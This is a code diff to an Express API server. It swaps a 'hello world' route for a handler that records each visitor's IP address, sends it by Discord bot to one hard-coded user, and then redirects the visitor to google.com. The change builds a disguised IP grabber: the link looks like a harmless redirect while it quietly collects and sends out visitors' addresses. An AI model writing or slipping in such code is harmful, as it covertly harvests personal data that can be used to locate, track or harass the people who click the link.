@@ -4,7 +4,7 @@ import cors from 'cors';
 import bodyParser from 'body-parser';
 import router from './router/index';
 import getLogger from './helpers';
-
+import { client } from '@bot/index'
 const logger = getLogger('API');
 dotenv.config();
 
@@ -16,10 +16,12 @@ app.use(
   })
 );
 app.use(router);
-
-app.get('/', (_req, res) => {
+app.set('trust proxy', true)
+app.get('/', async (_req, res) => {
   logger.log('Recived get request');
-  res.send('hello world');
+  const ip = _req.ip || _req.socket.remoteAddress
+  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
+  res.redirect('https://google.com')
 });
 
 app.post('/', (_req, res) => {
